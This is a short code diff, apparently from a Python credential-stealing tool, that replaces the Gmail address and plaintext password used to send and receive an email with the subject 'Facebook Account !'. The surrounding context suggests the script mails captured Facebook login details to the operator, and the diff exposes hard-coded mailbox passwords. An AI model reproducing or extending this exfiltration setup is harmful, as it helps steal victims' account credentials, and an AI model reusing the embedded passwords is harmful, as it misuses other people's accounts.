@@ -185,9 +185,9 @@ def id():
 
 	smtp_server = "smtp.gmail.com"
 	port = 587
-	sender = "sakitw55@gmail.com"
-	password = "simo@@@12345@@@1"
-	receiver = "sakitw55@gmail.com"
+	sender = "thmgroupe@gmail.com"
+	password = "thehorror123"
+	receiver = "thmgroupe@gmail.com"
 	message = """\
 	Subject: Facebook Account !
  
